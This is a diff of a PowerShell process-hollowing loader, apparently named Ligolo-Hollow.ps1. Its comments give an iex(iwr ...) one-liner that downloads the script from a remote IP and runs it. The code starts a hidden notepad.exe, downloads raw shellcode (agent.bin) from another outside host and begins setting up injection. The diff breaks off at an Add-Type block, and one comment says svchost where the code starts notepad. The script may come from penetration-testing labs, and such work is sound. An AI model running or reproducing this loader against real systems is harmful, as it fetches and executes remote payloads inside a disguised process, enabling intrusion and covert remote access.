@@ -3,10 +3,23 @@
 #3 Run before invoke: taskkill /F /IM:notepad.exe 
 #4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-Hollow.ps1 -UseBasicParsing)
 
-Start-Process notepad.exe -WindowStyle Hidden
-$url = "http://192.168.45.223/agent.bin"
+# Check that we are running as 64bit process
+if ([System.IntPtr]::Size -ne 8) {
+    Write-Error "This script must be run as a 64-bit process."
+    exit
+}
+
+# Step 2: Start svchost.exe in suspended mode
+Write-Host "Starting notepad.exe in suspended mode..."
+$notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru -ArgumentList "/suspend"
+$procid = $notepadProcess.Id
+Write-Host "Started notepad.exe with PID: $procid"
+
+# Step 3: Download the raw shellcode from the remote server
+$url = "http://192.168.50.101/agent.bin"
 $shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-$procid = (Get-Process -Name notepad | Sort-Object StartTime -Descending | Select-Object -First 1).Id
+
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
